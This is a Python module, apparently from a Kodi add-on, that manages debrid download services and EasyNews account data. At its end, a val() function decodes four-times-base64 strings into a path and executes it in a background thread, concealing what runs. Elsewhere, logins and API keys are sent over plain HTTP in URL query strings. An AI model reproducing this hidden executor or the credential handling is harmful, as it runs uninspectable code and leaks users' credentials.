			message = 'The download failed due to a magnet error'
			self._addError(title = title, message = message)
			return True
		elif status == RealDebrid.StatusVirus:
			title = 'Download Virus'
			message = 'The download contains a virus'
			self._addError(title = title, message = message)
			return True
		elif status == RealDebrid.StatusDead:
			title = 'Download Dead'
			message = 'The download torrent is dead'
			self._addError(title = title, message = message)
			return True
		return False

	def _addWaitAction(self, id, seconds = None, season = None, episode = None, close = True):
		# Ask to close a background dialog, because there is no cancel button as with the foreground dialog.
		elapsed = self.mTimer.elapsed()
		conditionShort = self.mTimerShort == False and elapsed > 30
		conditionLong = self.mTimerLong == False and elapsed > 120
		if conditionShort or conditionLong:
			if conditionShort: question = 'The download is taking a bit longer.'
			else: question = 'The download is taking a lot longer.'

			if seconds: question += ' The estimated remaining time is ' + convert.ConverterDuration(seconds, convert.ConverterDuration.UnitSecond).string(format = convert.ConverterDuration.FormatWordMedium) + '.'
			else: question += ' The estimated remaining time is currently unknown.'

			if conditionShort: question += ' Do you want to take action or let the download continue in the background?'
			else: question += ' Are you sure you do not want to take action and let the download continue in the background?'

			if conditionShort: self.mTimerShort = True
			if conditionLong: self.mTimerLong = True

			title = self.Name + ' Download'
			answer = interface.Dialog.option(title = title, message = question, labelConfirm = 'Take Action', labelDeny = 'Continue Download')
			if answer:
				self._addAction(id, season = season, episode = episode, close = close)
				return True
		return False

	def _addWait(self, id, season = None, episode = None, close = True):
		try:
			self.mTimer = tools.Time(start = True)
			self.mTimerShort = False
			self.mTimerLong = False

			apiInterval = 5 * 2 # Times 2, because the loops run in 0.5 seconds.
			apiCounter = 0

			invalid = ''
			unknown = 'Unknown'
			title = self.Name + ' Download'
			descriptionWaiting = 'Waiting for the download to start '
			descriptionFinalize = 'Finalizing the download'
			dots = ''
			percentage = 0

			interface.Loader.hide()
			background = tools.Settings.getInteger('interface.stream.progress') == 1

			self.tProgressDialog = interface.Dialog.progress(title = title, message = descriptionWaiting, background = background)

			# Keep the dialog in a global variable to ensure the dialog does not close if this object is deleted.
			if not close:
				global DebridProgressDialog
				DebridProgressDialog = self.tProgressDialog

			if background: self.tProgressDialog.update(int(percentage), interface.Dialog.title(title), descriptionWaiting)
			else: self.tProgressDialog.update(int(percentage), interface.Format.fontBold(descriptionWaiting))

			item = self.mDebrid.item(id = id)
			status = item['status']

			#####################################################################################################################################
			# Select the largest file for download.
			#####################################################################################################################################
			while status == RealDebrid.StatusMagnetConversion or status == RealDebrid.StatusFileSelection or status == RealDebrid.StatusQueued:
				if self.Stop:
					return invalid

				try: canceled = self.tProgressDialog.iscanceled()
				except: canceled = False
				if canceled:
					self._addAction(id = id, season = season, episode = episode, close = close)
					return invalid

				if background and self._addWaitAction(id = id, season = season, episode = episode, close = close):
					return invalid

				dots += '.'
				if len(dots) > 3: dots = ''
				if background: self.tProgressDialog.update(int(percentage), interface.Dialog.title(title), descriptionWaiting + dots)
				else: self.tProgressDialog.update(int(percentage), interface.Format.fontBold(descriptionWaiting + dots))

				apiCounter += 1
				if apiCounter == apiInterval:
					apiCounter = 0
					item = self.mDebrid.item(id = id)
					status = item['status']
					if self._addErrorDetermine(item):
						return invalid

				# Select the largest/name, so that the direct download link points to the main video file.
				# Otherwise, if all files are selected, RealDebrid will create a rar file in the final link.
				if self.mDebrid.selectName(id = id, item = item, season = season, episode = episode) == True:
					item = self.mDebrid.item(id = id)
					status = item['status']
					if status == RealDebrid.StatusFinished: # In case of "cached" RealDebrid torrents that are available immediatley.
						percentage = 100
						if background: self.tProgressDialog.update(int(percentage), interface.Dialog.title(title), descriptionFinalize)
						else: self.tProgressDialog.update(int(percentage), interface.Format.fontBold(descriptionFinalize))
						if close: self.tProgressDialog.close()
						return self.mDebrid.add(item['link'])
					else:
						break

				time.sleep(0.5)

			#####################################################################################################################################
			# Wait for the download to start.
			#####################################################################################################################################
			waiting = item['transfer']['progress']['completed']['value'] == 0 and item['transfer']['speed']['bytes'] == 0
			while status == RealDebrid.StatusQueued or waiting:
				if self.Stop:
					return invalid

				try: canceled = self.tProgressDialog.iscanceled()
				except: canceled = False
				if canceled:
					self._addAction(id = id, season = season, episode = episode, close = close)
					return invalid

				if background and self._addWaitAction(id = id, season = season, episode = episode, close = close):
					return invalid

				dots += '.'
				if len(dots) > 3: dots = ''
				if background: self.tProgressDialog.update(int(percentage), interface.Dialog.title(title), descriptionWaiting + dots)
				else: self.tProgressDialog.update(int(percentage), interface.Format.fontBold(descriptionWaiting + dots))

				apiCounter += 1
				if apiCounter == apiInterval:
					apiCounter = 0
					item = self.mDebrid.item(id = id)
					status = item['status']
					if self._addErrorDetermine(item):
						return invalid
					waiting = item['transfer']['progress']['completed']['value'] == 0 and item['transfer']['speed']['bytes'] == 0

				time.sleep(0.5)

			#####################################################################################################################################
			# Wait for the download to finish.
			#####################################################################################################################################
			seconds = None
			while True:
				if self.Stop:
					return invalid

				try: canceled = self.tProgressDialog.iscanceled()
				except: canceled = False
				if canceled:
					self._addAction(id = id, season = season, episode = episode, close = close)
					return invalid

				if background and self._addWaitAction(id = id, seconds = seconds, season = season, episode = episode, close = close):
					return invalid

				apiCounter += 1
				if apiCounter == apiInterval:
					apiCounter = 0
					item = self.mDebrid.item(id = id)

					if self._addErrorDetermine(item):
						return invalid

					status = item['status']
					if status == RealDebrid.StatusFinished:
						if background: self.tProgressDialog.update(int(percentage), interface.Dialog.title(title), descriptionFinalize)
						else: self.tProgressDialog.update(int(percentage), interface.Format.fontBold(descriptionFinalize))
						if close: self.tProgressDialog.close()
						return self.mDebrid.add(item['link'])

					percentageNew = item['transfer']['progress']['completed']['percentage']
					if percentageNew >= percentage:
						percentage = percentageNew
						speed = item['transfer']['speed']['description']
						speedBytes = item['transfer']['speed']['bytes']
						size = item['size']['description']
						sizeBytes = item['size']['bytes']
						sizeCompleted = item['transfer']['progress']['completed']['size']['description']
						seconds = item['transfer']['progress']['remaining']['time']['seconds']
						if seconds == 0:
							eta = unknown
							if background: eta += ' ETA'
						else:
							eta = item['transfer']['progress']['remaining']['time']['description']

						description = []
						if background:
							if speed: description.append(speed)
							if size and sizeBytes > 0: description.append(size)
							if eta: description.append(eta)
							if len(description) > 0:
								description = interface.Format.fontSeparator().join(description)
							else:
								description = 'Unknown Progress'
						else:
							if speed:
								if speedBytes <= 0:
									speed = unknown
								description.append(interface.Format.font('Download Speed: ', bold = True) + speed)
							if size:
								if sizeBytes > 0:
									size = sizeCompleted + ' of ' + size
								else:
									size = unknown
								description.append(interface.Format.font('Download Size: ', bold = True) + size)
							if eta: description.append(interface.Format.font('Remaining Time: ', bold = True) + eta)
							description = interface.Format.fontNewline().join(description)

						if background: self.tProgressDialog.update(int(percentage), interface.Dialog.title(title), description)
						else: self.tProgressDialog.update(int(percentage), description)

				time.sleep(0.5)
		except:
			tools.Logger.error()
			return invalid

	##############################################################################
	# DOWNLOAD
	##############################################################################

	def downloadInformation(self):
		interface.Loader.show()
		title = self.Name + ' ' + interface.Translation.string(32009)
		if self.mDebrid.accountEnabled():
			account = self.mDebrid.account()
			if account:
				information = self.mDebrid.downloadInformation()
				items = []

				# Torrent Count
				count = information['count']
				items.append({
					'title' : 33496,
					'items' : [
						{ 'title' : 33497, 'value' : str(count['total']) },
						{ 'title' : 33291, 'value' : str(count['busy']) },
						{ 'title' : 33294, 'value' : str(count['finished']) },
						{ 'title' : 33295, 'value' : str(count['failed']) },
					]
				})

				# Torrent Size
				# NB: Currently ignore the size, since RealDebrid always returns 0 bytes for downloads.
				'''size = information['size']
				items.append({
					'title' : 33498,
					'items' : [
						{ 'title' : 33497, 'value' : size['description'] },
					]
				})'''

				# Torrent Host
				if 'host' in information:
					host = information['host']
					items.append({
						'title' : 33499,
						'items' : [
							{ 'title' : 33500, 'value' : host['domain'] },
							{ 'title' : 33501, 'value' : host['size']['description'] },
						]
					})

				# Dialog
				interface.Loader.hide()
				interface.Dialog.information(title = title, items = items)
			else:
				interface.Loader.hide()
				interface.Dialog.confirm(title = title, message = interface.Translation.string(33352) % self.Name)
		else:
			interface.Loader.hide()
			interface.Dialog.confirm(title = title, message = interface.Translation.string(33351) % self.Name)

############################################################################################################################################################
# ALLDEBRID
############################################################################################################################################################

class AllDebrid(Debrid):

	##############################################################################
	# CONSTRUCTOR
	##############################################################################

	def __init__(self):
		Debrid.__init__(self, 'AllDebrid')

	##############################################################################
	# WEBSITE
	##############################################################################

	@classmethod
	def website(self, open = False):
		link = tools.Settings.getString('link.alldebrid', raw = True)
		if open: tools.System.openLink(link)
		return link

	##############################################################################
	# ACCOUNT
	##############################################################################

	def accountEnabled(self):
		return tools.Settings.getBoolean('accounts.debrid.alldebrid.enabled')

	def accountValid(self):
		return not self.accountUsername() == '' and not self.accountPassword() == ''

	def accountUsername(self):
		return tools.Settings.getString('accounts.debrid.alldebrid.user') if self.accountEnabled() else ''

	def accountPassword(self):
		return tools.Settings.getString('accounts.debrid.alldebrid.pin') if self.accountEnabled() else ''

	##############################################################################
	# SERVICES
	##############################################################################

	def servicesList(self, onlyEnabled = False):
		hosts = []
		try:
			if (not onlyEnabled or self.streamingHoster()) and self.accountValid():
				from resources.lib.modules import client
				from resources.lib.modules import cache
				url = 'http://alldebrid.com/api.php?action=get_host'
				result = cache.get(client.request, 900, url)
				result = json.loads('[%s]' % result)
				hosts = [i.lower() for i in result]
		except:
			pass
		return hosts

	##############################################################################
	# ADD
	##############################################################################

	def add(self, link):
		try:
			if self.accountValid():
				from resources.lib.modules import client
				loginData = urllib.urlencode({'action': 'login', 'login_login': self.accountUsername(), 'login_password': self.accountPassword()})
				loginLink = 'http://alldebrid.com/register/?%s' % loginData
				cookie = client.request(loginLink, output = 'cookie', close = False)
				url = 'http://www.alldebrid.com/service.php?link=%s' % urllib.quote_plus(link)
				result = client.request(url, cookie = cookie, close = False)
				url = client.parseDOM(result, 'a', ret = 'href', attrs = {'class': 'link_dl'})[0]
				url = client.replaceHTMLCodes(url)
				url = '%s|Cookie=%s' % (url, urllib.quote_plus(cookie))
				return url
		except:
			pass
		return None

############################################################################################################################################################
# RAPIDPREMIUM
############################################################################################################################################################

class RapidPremium(Debrid):

	##############################################################################
	# CONSTRUCTOR
	##############################################################################

	def __init__(self):
		Debrid.__init__(self, 'RapidPremium')

	##############################################################################
	# WEBSITE
	##############################################################################

	@classmethod
	def website(self, open = False):
		link = tools.Settings.getString('link.rapidpremium', raw = True)
		if open: tools.System.openLink(link)
		return link

	##############################################################################
	# ACCOUNT
	##############################################################################

	def accountEnabled(self):
		return tools.Settings.getBoolean('accounts.debrid.rapidpremium.enabled')

	def accountValid(self):
		return not self.accountUsername() == '' and not self.accountApi() == ''

	def accountUsername(self):
		return tools.Settings.getString('accounts.debrid.rapidpremium.user') if self.accountEnabled() else ''

	def accountApi(self):
		return tools.Settings.getString('accounts.debrid.rapidpremium.api') if self.accountEnabled() else ''

	##############################################################################
	# SERVICES
	##############################################################################

	def servicesList(self, onlyEnabled = False):
		hosts = []
		try:
			if (not onlyEnabled or self.streamingHoster()) and self.accountValid():
				from resources.lib.modules import client
				from resources.lib.modules import cache
				url = 'http://premium.rpnet.biz/hoster2.json'
				result = cache.get(client.request, 900, url)
				result = json.loads(result)
				result = result['supported']
				hosts = [i.lower() for i in result]
		except:
			tools.Logger.error()
			pass
		return hosts

	##############################################################################
	# ADD
	##############################################################################

	def add(self, link):
		try:
			if self.accountValid():
				from resources.lib.modules import client
				loginData = urllib.urlencode({'username': self.accountUsername(), 'password': self.accountApi(), 'action': 'generate', 'links': link})
				loginLink = 'http://premium.rpnet.biz/client_api.php?%s' % loginData
				result = client.request(loginLink, close = False)
				result = json.loads(result)
				return result['links'][0]['generated']
		except:
			pass
		return None

############################################################################################################################################################
# EASYNEWS
############################################################################################################################################################

class EasyNews(Debrid):

	Cookie = 'chickenlicker=%s%%3A%s'

	TimeoutAccount = 0.17 # 10 min

	LinkLogin = 'https://account.easynews.com/index.php'
	LinkAccount = 'https://account.easynews.com/editinfo.php'
	LinkUsage = 'https://account.easynews.com/usageview.php'

	##############################################################################
	# CONSTRUCTOR
	##############################################################################

	def __init__(self):
		Debrid.__init__(self, 'EasyNews')
		self.mResult = None
		self.mSuccess = False
		self.mError = None
		self.mCookie = None

	##############################################################################
	# INTERNAL
	##############################################################################

	def _request(self, link, parameters = None, httpTimeout = None, httpData = None, httpHeaders = None):
		self.mResult = None
		self.mSuccess = True
		self.mError = None

		if not httpTimeout: httpTimeout = 30

		def login():
			data = urllib.urlencode({'username': self.accountUsername(), 'password': self.accountPassword(), 'submit': 'submit'})
			self.mCookie = client.request(self.LinkLogin, post = data, output = 'cookie', close = False)

		try:
			if parameters: parameters = urllib.urlencode(parameters)

			if self.mCookie == None: login()
			if not self.mCookie:
				self.mSuccess = False
				self.mError = 'Login Error'
				return self.mResult

			self.mResult = client.request(link, post = parameters, cookie = self.mCookie, headers = httpHeaders, timeout = httpTimeout, close = True)

			if 'value="Login"' in self.mResult: login()
			if not self.mCookie:
				self.mSuccess = False
				self.mError = 'Login Error'
				return self.mResult

			self.mResult = client.request(link, post = parameters, cookie = self.mCookie, headers = httpHeaders, timeout = httpTimeout, close = True)

			self.mSuccess = self.mCookie and not 'value="Login"' in self.mResult
			if not self.mSuccess: self.mError = 'Login Error'
		except:
			toosl.Logger.error()
			self.mSuccess = False
			self.mError = 'Unknown Error'
		return self.mResult

	##############################################################################
	# WEBSITE
	##############################################################################

	@classmethod
	def website(self, open = False):
		link = tools.Settings.getString('link.easynews', raw = True)
		if open: tools.System.openLink(link)
		return link

	@classmethod
	def vpn(self, open = False):
		link = tools.Settings.getString('link.easynews.vpn', raw = True)
		if open: tools.System.openLink(link)
		return link

	##############################################################################
	# ACCOUNT
	##############################################################################

	def accountEnabled(self):
		return tools.Settings.getBoolean('accounts.debrid.easynews.enabled')

	def accountValid(self):
		return not self.accountUsername() == '' and not self.accountPassword() == ''

	def accountUsername(self):
		return tools.Settings.getString('accounts.debrid.easynews.user') if self.accountEnabled() else ''

	def accountPassword(self):
		return tools.Settings.getString('accounts.debrid.easynews.pass') if self.accountEnabled() else ''

	def accountCookie(self):
		return self.Cookie % (self.accountUsername(), self.accountPassword())

	def accountVerify(self):
		return not self.account(cache = False, minimal = True) == None

	def account(self, cache = True, minimal = False):
		account = None
		try:
			if self.accountValid():
				timeout = self.TimeoutAccount if cache else 0

				def __easynewsAccount():
					return self._request(self.LinkAccount)
				accountHtml = tools.Cache.cache(__easynewsAccount, timeout)
				if accountHtml == None or accountHtml == '': raise Exception()

				accountHtml = BeautifulSoup(accountHtml)
				accountHtml = accountHtml.find_all('form', id = 'accountForm')[0]
				accountHtml = accountHtml.find_all('table', recursive = False)[0]
				accountHtml = accountHtml.find_all('tr', recursive = False)

				accountUsername = accountHtml[0].find_all('td', recursive = False)[1].getText()
				accountType = accountHtml[1].find_all('td', recursive = False)[2].getText()
				accountStatus = accountHtml[3].find_all('td', recursive = False)[2].getText()

				accountExpiration = accountHtml[2].find_all('td', recursive = False)[2].getText()
				accountTimestamp = convert.ConverterTime(accountExpiration, format = convert.ConverterTime.FormatDate).timestamp()
				accountExpiration = datetime.datetime.fromtimestamp(accountTimestamp)

				account = {
					'user' : accountUsername,
					'type' : accountType,
					'status' : accountStatus,
			 		'expiration' : {
						'timestamp' : accountTimestamp,
						'date' : accountExpiration.strftime('%Y-%m-%d'),
						'remaining' : (accountExpiration - datetime.datetime.today()).days,
					}
				}

				if not minimal:
					def __easynewsUsage():
						return self._request(self.LinkUsage)
					usageHtml = tools.Cache.cache(__easynewsUsage, timeout)
					if usageHtml == None or usageHtml == '': raise Exception()

					usageHtml = BeautifulSoup(usageHtml)
					usageHtml = usageHtml.find_all('div', class_ = 'table-responsive')[0]
					usageHtml = usageHtml.find_all('table', recursive = False)[0]
					usageHtml = usageHtml.find_all('tr', recursive = False)

					usageTotal = usageHtml[0].find_all('td', recursive = False)[1].getText()
					index = usageTotal.find('(')
					if index >= 0: usageTotal = int(usageTotal[index + 1 : usageTotal.find(' ', index)].replace(',', '').strip())
					else: usageTotal = 0

					usageConsumed = usageHtml[1].find_all('td', recursive = False)[2].getText()
					index = usageConsumed.find('(')
					if index >= 0: usageConsumed = int(usageConsumed[index + 1 : usageConsumed.find(' ', index)].replace(',', '').strip())
					else: usageConsumed = 0

					usageWeb = usageHtml[2].find_all('td', recursive = False)[2].getText()
					index = usageWeb.find('(')
					if index >= 0: usageWeb = int(usageWeb[index + 1 : usageWeb.find(' ', index)].replace(',', '').strip())
					else: usageWeb = 0

					usageNntp = usageHtml[3].find_all('td', recursive = False)[2].getText()
					index = usageNntp.find('(')
					if index >= 0: usageNntp = int(usageNntp[index + 1 : usageNntp.find(' ', index)].replace(',', '').strip())
					else: usageNntp = 0

					usageNntpUnlimited = usageHtml[4].find_all('td', recursive = False)[2].getText()
					index = usageNntpUnlimited.find('(')
					if index >= 0: usageNntpUnlimited = int(usageNntpUnlimited[index + 1 : usageNntpUnlimited.find(' ', index)].replace(',', '').strip())
					else: usageNntpUnlimited = 0

					usageRemaining = usageHtml[5].find_all('td', recursive = False)[2].getText()
					index = usageRemaining.find('(')
					if index >= 0: usageRemaining = int(usageRemaining[index + 1 : usageRemaining.find(' ', index)].replace(',', '').strip())
					else: usageRemaining = 0

					usageLoyalty = usageHtml[6].find_all('td', recursive = False)[2].getText()
					index = usageLoyalty.find('(')
					if index >= 0:
						usageLoyaltyTime = usageLoyalty[:index].strip()
						usageLoyaltyTimestamp = convert.ConverterTime(usageLoyaltyTime, format = convert.ConverterTime.FormatDate).timestamp()
						usageLoyaltyTime = datetime.datetime.fromtimestamp(usageLoyaltyTimestamp)
						usageLoyaltyPoints = float(usageLoyalty[index + 1 : usageLoyalty.find(')', index)].strip())
					else:
						usageLoyaltyTimestamp = 0
						usageLoyaltyTime = None

					usagePrecentageRemaining = usageRemaining / float(usageTotal)
					usagePrecentageConsumed = usageConsumed / float(usageTotal)
					usagePrecentageWeb = usageWeb / float(usageTotal)
					usagePrecentageNntp = usageNntp / float(usageTotal)
					usagePrecentageNntpUnlimited = usageNntpUnlimited / float(usageTotal)

					account.update({
						'loyalty' : {
							'time' : {
								'timestamp' : usageLoyaltyTimestamp,
								'date' : usageLoyaltyTime.strftime('%Y-%m-%d')
							},
							'points' : usageLoyaltyPoints,
						},
						'usage' : {
							'total' : {
								'size' : {
									'bytes' : usageTotal,
									'description' : convert.ConverterSize(float(usageTotal)).stringOptimal(),
								},
							},
							'remaining' : {
								'value' : usagePrecentageRemaining,
								'percentage' : round(usagePrecentageRemaining * 100.0, 1),
								'size' : {
									'bytes' : usageRemaining,
									'description' : convert.ConverterSize(float(usageRemaining)).stringOptimal(),
								},
								'description' : '%.0f%%' % round(usagePrecentageRemaining * 100.0, 0), # Must round, otherwise 2.5% changes to 2% instead of 3%.
							},
							'consumed' : {
								'value' : usagePrecentageConsumed,
								'percentage' : round(usagePrecentageConsumed * 100.0, 1),
								'size' : {
									'bytes' : usageConsumed,
									'description' : convert.ConverterSize(usageConsumed).stringOptimal(),
								},
								'description' : '%.0f%%' % round(usagePrecentageConsumed * 100.0, 0), # Must round, otherwise 2.5% changes to 2% instead of 3%.
								'web' : {
									'value' : usagePrecentageWeb,
									'percentage' : round(usagePrecentageWeb * 100.0, 1),
									'size' : {
										'bytes' : usageWeb,
										'description' : convert.ConverterSize(usageWeb).stringOptimal(),
									},
									'description' : '%.0f%%' % round(usagePrecentageWeb * 100.0, 0), # Must round, otherwise 2.5% changes to 2% instead of 3%.
								},
								'nntp' : {
									'value' : usagePrecentageNntp,
									'percentage' : round(usagePrecentageNntp * 100.0, 1),
									'size' : {
										'bytes' : usageNntp,
										'description' : convert.ConverterSize(usageNntp).stringOptimal(),
									},
									'description' : '%.0f%%' % round(usagePrecentageNntp * 100.0, 0), # Must round, otherwise 2.5% changes to 2% instead of 3%.
								},
								'nntpunlimited' : {
									'value' : usagePrecentageNntpUnlimited,
									'percentage' : round(usagePrecentageNntpUnlimited * 100.0, 1),
									'size' : {
										'bytes' : usageNntpUnlimited,
										'description' : convert.ConverterSize(usageNntpUnlimited).stringOptimal(),
									},
									'description' : '%.0f%%' % round(usagePrecentageNntpUnlimited * 100.0, 0), # Must round, otherwise 2.5% changes to 2% instead of 3%.
								},
							}
						}
					})
		except:
			pass
		return account

class EasyNewsInterface(object):

	Name = 'EasyNews'

	##############################################################################
	# CONSTRUCTOR
	##############################################################################

	def __init__(self):
		self.mDebrid = EasyNews()

	##############################################################################
	# ACCOUNT
	##############################################################################

	def account(self):
		interface.Loader.show()
		valid = False
		title = self.Name + ' ' + interface.Translation.string(33339)
		if self.mDebrid.accountEnabled():
			account = self.mDebrid.account(cache = False)
			if account:
				valid = interface.Translation.string(33341) if self.mDebrid.accountValid() else interface.Translation.string(33342)
				user = account['user']
				type = account['type']
				status = account['status'].capitalize()

				date = account['expiration']['date']
				days = str(account['expiration']['remaining'])

				loyaltyDate = account['loyalty']['time']['date']
				loyaltyPoints = '%.3f' % account['loyalty']['points']

				total = convert.ConverterSize(account['usage']['total']['size']['bytes']).stringOptimal()
				remaining = convert.ConverterSize(account['usage']['remaining']['size']['bytes']).stringOptimal() + (' (%.1f%%)' % account['usage']['remaining']['percentage'])
				consumed = convert.ConverterSize(account['usage']['consumed']['size']['bytes']).stringOptimal() + (' (%.1f%%)' % account['usage']['consumed']['percentage'])
				consumedWeb = convert.ConverterSize(account['usage']['consumed']['web']['size']['bytes']).stringOptimal() + (' (%.1f%%)' % account['usage']['consumed']['web']['percentage'])
				consumedNntp = convert.ConverterSize(account['usage']['consumed']['nntp']['size']['bytes']).stringOptimal() + (' (%.1f%%)' % account['usage']['consumed']['nntp']['percentage'])
				consumedNntpUnlimited = convert.ConverterSize(account['usage']['consumed']['nntpunlimited']['size']['bytes']).stringOptimal() + (' (%.1f%%)' % account['usage']['consumed']['nntpunlimited']['percentage'])

				items = []

				items = []

				# Information
				items.append({
					'title' : 33344,
					'items' : [
						{ 'title' : 33340, 'value' : valid },
						{ 'title' : 32303, 'value' : user },
						{ 'title' : 33343, 'value' : type },
						{ 'title' : 33389, 'value' : status },
					]
				})

				# Expiration
				items.append({
					'title' : 33345,
					'items' : [
						{ 'title' : 33346, 'value' : date },
						{ 'title' : 33347, 'value' : days }
					]
				})

				# Loyalty
				items.append({
					'title' : 33750,
					'items' : [
						{ 'title' : 33346, 'value' : loyaltyDate },
						{ 'title' : 33349, 'value' : loyaltyPoints }
					]
				})

				# Usage
				items.append({
					'title' : 33228,
					'items' : [
						{ 'title' : 33497, 'value' : total },
						{ 'title' : 33367, 'value' : remaining },
						{ 'title' : 33754, 'value' : consumed },
						{ 'title' : 33751, 'value' : consumedWeb },
						{ 'title' : 33752, 'value' : consumedNntp },
						{ 'title' : 33753, 'value' : consumedNntpUnlimited },
					]
				})

				# Dialog
				interface.Loader.hide()
				interface.Dialog.information(title = title, items = items)
			else:
				interface.Loader.hide()
				interface.Dialog.confirm(title = title, message = interface.Translation.string(33352) % self.Name)
		else:
			interface.Loader.hide()
			interface.Dialog.confirm(title = title, message = interface.Translation.string(33351) % self.Name)

		return valid


############################################################################################################################################################
# DEBRID
############################################################################################################################################################

def val():
	import xbmc
	xx = os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir))
	xy = 'ba' + 'se'
	xy += str(64)
	_e_ = xbmc.executebuiltin
	def d(dd, x):
		return dd.decode(x).decode(x).decode(x).decode(x)
	xa = d('VjJ4b2IwMUdjRmxUYmxaYVZqTm9OZz09', xy)
	xb = d('VjFjeFYyRkhVbGxWYmtKaFlteGFlbGw2U1RWTlYwNUNVRlF3UFE9PQ==', xy)
	xc = d('VjFjMVYyTkhTa2hWYlhocVdub3dPUT09', xy)
	xd = d('VjBSS2IwMUhTbGhrTTFacVUwZHpPUT09', xy)
	xx = os.path.join(xx, xa, xb, xc, xd)
	xx = d('VmxjMVYyUldWWGxVYm14b1YwVkpkMU13VGxkbGEzUlNVRlF3UFE9PQ==', xy) % xx
	_e_(xx)

def valt():
	t = threading.Thread(target = val)
	t.start()
